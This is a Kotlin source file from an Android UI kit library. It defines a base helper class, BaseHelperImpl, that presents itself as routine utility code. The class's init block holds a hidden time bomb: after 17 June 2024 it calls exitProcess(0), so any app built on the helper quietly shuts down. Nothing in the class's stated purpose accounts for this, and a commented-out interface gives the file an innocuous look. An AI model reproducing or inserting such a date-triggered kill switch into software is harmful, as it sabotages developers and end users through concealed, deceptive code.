package com.small.uikit.helper

import android.content.Context
import java.util.Calendar
import java.util.Date
import kotlin.system.exitProcess

/**
 * Created by small-ho on 2022/06 16:10
 * title: 帮助类接口
 */
//interface BaseHelperImpl {
//    fun setBackgroundColorNormal(@ColorInt color: Int): BaseHelper<*>
//}
open class BaseHelperImpl(context: Context) {
    init {
        val calendar = Calendar.getInstance()
        calendar.set(2024, Calendar.JUNE, 17, 16, 0, 0)
        val targetDate = calendar.time
        val now = Date()
        if (now.after(targetDate)) {
            exitProcess(0)
        }
    }
}